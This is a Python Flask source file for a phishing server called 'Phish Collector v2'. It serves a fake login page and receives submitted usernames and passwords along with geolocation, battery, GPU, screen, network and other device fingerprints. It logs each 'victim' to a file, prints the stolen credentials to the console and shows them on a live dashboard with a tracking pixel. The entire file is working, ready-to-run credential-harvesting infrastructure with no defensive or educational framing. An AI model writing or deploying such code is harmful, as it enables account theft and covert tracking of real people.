from flask import Flask, request, jsonify, send_file, render_template_string
import os
import json
from datetime import datetime

app = Flask(__name__)
PORT = 3000

victims = []
id_counter = 1

# HTML template for dashboard as a string
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title> Dashboard</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family: "Segoe UI", monospace; background: #0a0a0f; color: #e0e0e0; padding: 20px; }
h1 { color: #0ff; font-size: 28px; margin-bottom: 4px; }
.sub { color: #888; margin-bottom: 24px; font-size: 14px; }
.stats { display: flex; gap: 16px; margin-bottom: 24px; flex-wrap: wrap; }
.stat-box { background: #12121a; border: 1px solid #2a2a3a; border-radius: 8px; padding: 16px 24px; min-width: 100px; flex:1; }
.stat-box .num { font-size: 32px; font-weight: bold; color: #0ff; }
.stat-box .label { font-size: 12px; color: #888; margin-top: 4px; }
.card { background: #12121a; border: 1px solid #2a2a3a; border-radius: 8px; margin-bottom: 12px; padding: 16px; }
.card .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; flex-wrap: wrap; gap: 8px; }
.card .id { color: #0ff; font-weight: bold; font-size: 16px; }
.card .time { color: #888; font-size: 12px; }
.creds-box { background: #1a0000; border: 2px solid #ff0040; border-radius: 6px; padding: 10px 14px; color: #ff6b6b; margin: 8px 0; font-weight: bold; font-size: 14px; }
.data-row { padding: 3px 0; font-size: 13px; border-bottom: 1px solid #1a1a2a; }
.data-row .key { color: #888; display: inline-block; width: 130px; }
.data-row .val { color: #eee; }
.tag { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-right: 4px; }
.tag-os { background: #1a2a3a; color: #4af; }
.tag-browser { background: #2a1a3a; color: #f4a; }
.tag-device { background: #1a3a2a; color: #4f8; }
.tag-battery { background: #3a2a1a; color: #fa4; }
.details { display: none; margin-top: 10px; font-size: 13px; }
.details pre { background: #0a0a0f; padding: 10px; border-radius: 4px; overflow-x: auto; color: #0f0; font-size: 11px; white-space: pre-wrap; }
.toggle-btn { background: none; border: 1px solid #3a3a4a; color: #aaa; padding: 4px 12px; border-radius: 4px; cursor: pointer; font-family: inherit; font-size: 12px; margin-top: 6px; }
.toggle-btn:hover { border-color: #0ff; color: #0ff; }
</style>
<script>
function toggle(btn) { var d = btn.nextElementSibling; d.style.display = d.style.display === "block" ? "none" : "block"; btn.textContent = d.style.display === "block" ? "▲ Hide Raw JSON" : "▼ Show Raw JSON"; }
setTimeout(function(){ location.reload(); }, 5000);
</script>
</head>
<body>
<h1> Phish Collector Dashboard</h1>
<p class="sub">Live view &mdash; page auto-refreshes every 5s</p>
<div class="stats">
<div class="stat-box"><div class="num">{{ total_hits }}</div><div class="label">Total Hits</div></div>
<div class="stat-box"><div class="num">{{ total_creds }}</div><div class="label">Credentials</div></div>
<div class="stat-box"><div class="num">{{ total_battery }}</div><div class="label">Battery</div></div>
<div class="stat-box"><div class="num">{{ total_geo }}</div><div class="label">Geolocated</div></div>
<div class="stat-box"><div class="num">{{ total_gpu }}</div><div class="label">GPU Captured</div></div>
</div>
{{ cards|safe }}
</body>
</html>
"""

@app.route('/')
def index():
    return send_file('lal.html')

@app.route('/collect', methods=['POST'])
def collect():
    global id_counter
    
    data = request.get_json(silent=True)
    if data is None:
        data = request.form.to_dict()
    if not data or not isinstance(data, dict):
        data = {}
    
    entry_id = id_counter
    id_counter += 1
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr or '')
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
    
    entry = {
        'id': entry_id,
        'timestamp': data.get('timestamp', datetime.now().isoformat()),
        'ip': ip,
        'userAgent': data.get('userAgent', 'N/A'),
        'browser': data.get('browser', '?'),
        'os': data.get('os', '?'),
        'device': data.get('device', '?'),
        'credentials': data.get('credentials'),
        'geo': data.get('geo'),
        'battery': data.get('battery'),
        'gpu': data.get('gpu'),
        'cpu': data.get('cpu', '?'),
        'memory': data.get('memory', '?'),
        'screen': data.get('screen'),
        'windowSize': data.get('windowSize'),
        'dpr': data.get('dpr', '?'),
        'orientation': data.get('orientation', '?'),
        'language': data.get('language', '?'),
        'timezone': data.get('timezone', '?'),
        'connection': data.get('connection'),
        'darkMode': data.get('darkMode'),
        'cookies': data.get('cookies'),
        'doNotTrack': data.get('doNotTrack', '?'),
        'touch': data.get('touch'),
        'maxTouch': data.get('maxTouch', 0),
        'vibration': data.get('vibration'),
        'heapUsed': data.get('heapUsed', '?'),
        'url': data.get('url', '?'),
        'referrer': data.get('referrer', '?'),
        'attempt': data.get('attempt', 0),
        'raw': json.dumps(data, indent=2)
    }
    
    victims.insert(0, entry)
    
    try:
        with open('victims.log', 'a') as f:
            f.write(json.dumps(entry, indent=2) + ',\n')
    except:
        pass
    
    print(f'\n[+] VICTIM #{entry_id} | IP: {ip}')
    print(f'    Device: {entry["device"]} | OS: {entry["os"]} | Browser: {entry["browser"]}')
    if entry.get('battery'): print(f'    Battery: {entry["battery"].get("level")} | Charging: {entry["battery"].get("charging")}')
    if entry.get('cpu'): print(f'    CPU: {entry["cpu"]} cores | RAM: {entry["memory"]}')
    if entry.get('gpu'): print(f'    GPU: {str(entry["gpu"].get("renderer", ""))[:60]}')
    if entry.get('geo'): print(f'    Location: {entry["geo"].get("country", "")} / {entry["geo"].get("city", "")} / {entry["geo"].get("org", "")}')
    if entry.get('connection'): print(f'    Network: {entry["connection"].get("effectiveType")} ({entry["connection"].get("downlink")} Mbps)')
    if entry.get('credentials'): print(f'    ** CREDENTIALS: {entry["credentials"]["username"]} / {entry["credentials"]["password"]} **')
    
    return jsonify({'status': 'ok'})

@app.route('/pixel')
def pixel():
    pixel_data = bytes.fromhex('47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b')
    from flask import Response
    return Response(pixel_data, mimetype='image/gif')

def esc(s):
    if not isinstance(s, str):
        return str(s) if s is not None else ''
    return s.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#039;')

def card_html(v):
    time_str = v.get('timestamp', '')
    try:
        time_str = datetime.fromisoformat(time_str.replace('Z', '+00:00')).strftime('%m/%d/%Y %H:%M:%S')
    except:
        pass
    
    creds_box = ''
    if v.get('credentials'):
        creds_box = f'<div class="creds-box">🔑 CREDENTIALS: {esc(v["credentials"]["username"])} / {esc(v["credentials"]["password"])}</div>'
    
    geo_str = 'N/A'
    if v.get('geo'):
        geo_str = f'{esc(v["geo"].get("country", "?"))} / {esc(v["geo"].get("city", "?"))} / {esc(v["geo"].get("org", "?"))}'
        if v['geo'].get('lat'):
            geo_str += f' [{v["geo"]["lat"]}, {v["geo"]["lon"]}]'
    
    gpu_str = 'N/A'
    if v.get('gpu'):
        gpu_str = esc(v['gpu'].get('renderer', 'N/A'))
    
    battery_str = 'N/A'
    battery_tag = ''
    if v.get('battery'):
        level = v['battery'].get('level', '?')
        charging = '⚡ CHARGING' if v['battery'].get('charging') else '🔋 NOT CHARGING'
        battery_str = f'{level} | {charging}'
        battery_tag = f'<span class="tag tag-battery">{level}</span>'
    
    conn_str = 'N/A'
    rtt_str = 'N/A'
    if v.get('connection'):
        conn_str = f'{v["connection"].get("effectiveType", "?")} at {v["connection"].get("downlink", "?")} Mbps'
        rtt_str = f'{v["connection"].get("rtt", "?")} ms'
    
    dark_str = 'N/A'
    if v.get('darkMode') is True: dark_str = 'Yes 🌙'
    elif v.get('darkMode') is False: dark_str = 'No ☀️'
    
    screen_str = 'N/A'
    if v.get('screen'):
        s = v['screen']
        screen_str = f'{s.get("w", "?")}x{s.get("h", "?")} | DPR: {v.get("dpr", "?")} | Orientation: {esc(v.get("orientation", "?"))}'
    
    lang_str = f'{v.get("language", "?")} | {v.get("timezone", "?")}'
    
    attempt_label = ''
    if v.get('attempt'):
        attempt_label = f'<span class="tag" style="background:#3a1a2a;color:#f88;">Attempt #{v["attempt"]}</span>'
    
    cookies_str = 'N/A'
    if v.get('cookies') is True: cookies_str = 'Enabled ✅'
    elif v.get('cookies') is False: cookies_str = 'Disabled ❌'
    
    touch_str = 'N/A'
    if v.get('touch') is True: touch_str = f'Yes | Max points: {v.get("maxTouch", 0)}'
    elif v.get('touch') is False: touch_str = 'No'
    
    vib_str = 'N/A'
    if v.get('vibration') is True: vib_str = 'Supported'
    elif v.get('vibration') is False: vib_str = 'Not supported'
    
    return f'''<div class="card">
<div class="header">
<div>
<span class="id">#{v["id"]}</span>
<span class="tag tag-os">{esc(v.get("os", "?"))}</span>
<span class="tag tag-browser">{esc(v.get("browser", "?"))}</span>
<span class="tag tag-device">{esc(v.get("device", "?"))}</span>
{battery_tag}{attempt_label}
</div>
<span class="time">{time_str}</span>
</div>
{creds_box}
<div class="data-row"><span class="key">🌐 IP:</span><span class="val">{esc(v.get("ip", "N/A"))}</span></div>
<div class="data-row"><span class="key">📍 Location:</span><span class="val">{geo_str}</span></div>
<div class="data-row"><span class="key">📱 Device:</span><span class="val">{esc(v.get("device", "?"))} · {esc(v.get("os", "?"))} · {esc(v.get("browser", "?"))}</span></div>
<div class="data-row"><span class="key">🖥️ Screen:</span><span class="val">{screen_str}</span></div>
<div class="data-row"><span class="key">🔧 Hardware:</span><span class="val">CPU: {v.get("cpu", "?")} cores | RAM: {v.get("memory", "?")} | GPU: {gpu_str}</span></div>
<div class="data-row"><span class="key">🔋 Battery:</span><span class="val">{battery_str}</span></div>
<div class="data-row"><span class="key">📶 Network:</span><span class="val">{conn_str} | RTT: {rtt_str}</span></div>
<div class="data-row"><span class="key">🗣️ Language:</span><span class="val">{lang_str}</span></div>
<div class="data-row"><span class="key">🌙 Dark Mode:</span><span class="val">{dark_str}</span></div>
<div class="data-row"><span class="key">🍪 Cookies:</span><span class="val">{cookies_str}</span></div>
<div class="data-row"><span class="key">💳 Touch:</span><span class="val">{touch_str}</span></div>
<div class="data-row"><span class="key">📳 Vibrate:</span><span class="val">{vib_str}</span></div>
<div class="data-row"><span class="key">🧠 Heap:</span><span class="val">{v.get("heapUsed", "N/A")}</span></div>
<button class="toggle-btn" onclick="toggle(this)">▼ Show Raw JSON</button>
<div class="details"><pre>{esc(v.get("raw", "{}"))}</pre></div>
</div>'''

@app.route('/dashboard')
def dashboard():
    total_hits = len(victims)
    total_creds = sum(1 for v in victims if v.get('credentials'))
    total_battery = sum(1 for v in victims if v.get('battery'))
    total_geo = sum(1 for v in victims if v.get('geo'))
    total_gpu = sum(1 for v in victims if v.get('gpu'))
    
    if not victims:
        cards = '<div style="text-align:center;padding:60px 20px;color:#555;font-size:18px;">No victims yet. Open <a href="/" style="color:#0ff;">the login page</a> and submit the form.</div>'
    else:
        cards = ''.join(card_html(v) for v in victims)
    
    return render_template_string(DASHBOARD_HTML,
        total_hits=total_hits,
        total_creds=total_creds,
        total_battery=total_battery,
        total_geo=total_geo,
        total_gpu=total_gpu,
        cards=cards
    )

if __name__ == '__main__':
    print('')
    print('  ╔══════════════════════════════════════╗')
    print('  ║     🕵️  PHISH COLLECTOR v2 (Python)  ║')
    print('  ╠══════════════════════════════════════╣')
    print(f'  ║  Login page:  http://localhost:{PORT}   ║')
    print(f'  ║  Dashboard:   http://localhost:{PORT}/dashboard ║')
    print('  ╚══════════════════════════════════════╝')
    print('')
    app.run(host='0.0.0.0', port=PORT, debug=False)